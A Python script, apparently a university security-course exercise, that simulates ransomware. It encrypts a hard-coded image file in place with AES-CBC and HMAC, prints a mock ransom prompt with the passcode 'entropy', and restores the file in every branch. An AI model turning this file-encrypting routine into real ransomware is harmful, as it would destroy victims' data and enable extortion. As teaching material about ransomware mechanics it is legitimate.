import os
import os.path
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding, hashes, hmac
from cryptography.hazmat.backends import default_backend
from PIL import Image
import io

def myEncrypt(m, k):

    if(len(k) < 32):
        print('Error, key must be 32 bytes')
    else:
        IV = os.urandom(16)
        backend = default_backend()

        pad = padding.PKCS7(256).padder()
        p_data = pad.update(m)
        p_data += pad.finalize()

        cipher = Cipher(algorithms.AES(k), modes.CBC(IV), backend=backend)
        encryptor = cipher.encryptor()
        ct = encryptor.update(p_data)+encryptor.finalize()
  
        return ct, IV

def myEncryptHMAC(m, k, hKey):

    if(len(k) < 32):
        print('Error, key must be 32 bytes')
    else:
        IV = os.urandom(16)
        backend = default_backend()

        pad = padding.PKCS7(256).padder()
        p_data = pad.update(m)
        p_data += pad.finalize()

        cipher = Cipher(algorithms.AES(k), modes.CBC(IV), backend=backend)
        encryptor = cipher.encryptor()
        ct = encryptor.update(p_data)+encryptor.finalize()

        h = hmac.HMAC(hKey, hashes.SHA3_512(), backend=default_backend())
        h.update(ct)
        t = h.finalize()
        
        return ct, IV, t

def myfileEncrypt(path):

    key = os.urandom(32)
    img = open(path, "rb")
    m = img.read()
    img.close()

    fExt = os.path.splitext(path)[1]

    (ct, IV) = myEncrypt(m, key)

    img = open(path, "wb")
    img.write(ct)
    img.close()

    return (ct, IV, key, fExt)


def myfileEncryptHMAC(path):

    key = os.urandom(32)
    hKey = os.urandom(32)
    img = open(path, "rb")
    m = img.read()
    img.close()

    fExt = os.path.splitext(path)[1]

    (ct, IV, t) = myEncryptHMAC(m, key, hKey)

    img = open(path, "wb")
    img.write(ct)
    img.close()

    return (ct, IV, t, key, hKey, fExt)

def myDecrypt(k, IV, ct):

    backend = default_backend()
    
    
    c = Cipher(algorithms.AES(k), modes.CBC(IV), backend=backend)
    decrypt = c.decryptor()
    pt = decrypt.update(ct)+decrypt.finalize()

    unPad = padding.PKCS7(256).unpadder()
    m = unPad.update(pt)
    m += unPad.finalize()

    return m

def myDecryptHMAC(k, hKey, IV, ct, t):

    backend = default_backend()

    h = hmac.HMAC(hKey, hashes.SHA3_512(), backend = backend);
    h.update(ct)
    h.verify(t)
    
    c = Cipher(algorithms.AES(k), modes.CBC(IV), backend=backend)
    decrypt = c.decryptor()
    pt = decrypt.update(ct)+decrypt.finalize()

    unPad = padding.PKCS7(256).unpadder()
    m = unPad.update(pt)
    m += unPad.finalize()

    return m

def myfileDecrypt(ct, IV, k, path):
    pt = myDecrypt(k, IV, ct)

    img = open(path, "wb")
    img.write(pt)
    img.close()

    return pt


def myfileDecryptHMAC(ct, IV, t, k, hKey, path):
    pt = myDecryptHMAC(k, hKey, IV, ct, t)

    img = open(path, "wb")
    img.write(pt)
    img.close()

    return pt
    
def main():

    #$PATH: C:\Users\tacos\Desktop\CECS 378
    path = "C:\\Users\\tacos\\Desktop\\CECS 378\\gir.jpg"

    #(C, IV, k, fExt) = myfileEncrypt(path)
    (C, IV, t, k, hKey, fExt) = myfileEncryptHMAC(path)
   
    x = input('Pay ransom to decrypt data with a given valid input. (Y/N)')

    if(x.upper() == "Y"):
        print('You have paid, the code to recover data is: entropy')
        y = input('Enter passcode here: ')
        if(y == 'entropy'):
            myfileDecryptHMAC(C, IV, t, k, hKey, path)
            #myfileDecrypt(C, IV, k, path)
            f = Image.open('gir.jpg')
            f.show()
            f.close()
            print('You successfully saved your assets and I\'m rich, Hurray!')
            
        else:
            myfileDecryptHMAC(C, IV, t, k, hKey, path)
            #myfileDecrypt(C, IV, k, path)
            print('Failure...............')
            f = open(path, "rb")
            m = f.read()
            print(m)
            f.close()
    else:
        myfileDecryptHMAC(C, IV, t, k, hKey, path)
        #myfileDecrypt(C, IV, k, path)
        print("You failed to pay, enjoy decrypting manually")
        f = open(path, "rb")
        m = f.read()
        print(m)
        f.close()
   
main()



